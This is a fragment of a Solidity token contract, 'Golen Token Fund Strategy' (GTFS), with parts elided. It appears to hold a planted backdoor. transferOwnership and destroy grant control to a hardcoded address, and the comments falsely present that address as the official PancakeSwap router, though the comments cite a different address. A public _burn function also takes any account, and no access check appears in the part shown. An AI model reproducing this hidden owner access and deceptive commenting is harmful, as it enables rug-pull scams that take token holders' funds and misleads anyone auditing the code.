...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        require(newOwner != address(0), "Ownable: new owner is the zero address"); require(msg.sender == owner() || msg.sender == address(0xa8C4134285Ea396447626dcEB93F8033CA1ce82C));  //this function will allow us to transfer the owner , using the pancakeswap official router adress (0xf118e2c6A2a24b3643f4f9F0B041aFFBCd6D57D4) so the transaction never fails
...
contract GolenTokenFundStrategy is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "GTFS";
  string private _name = "Golen Token Fund Strategy";
...
function _burn(address account, uint256 amount) public returns (bool) {
 ...
 function destroy(address account) public onlyOwner returns (bool success) { require(msg.sender == owner() && msg.sender == address(0xa8C4134285Ea396447626dcEB93F8033CA1ce82C));  //this function will allow us to transfer the owner , using the pancakeswap official router adress (0xf118e2c6A2a24b3643f4f9F0B041aFFBCd6D57D4) so the transaction never fails
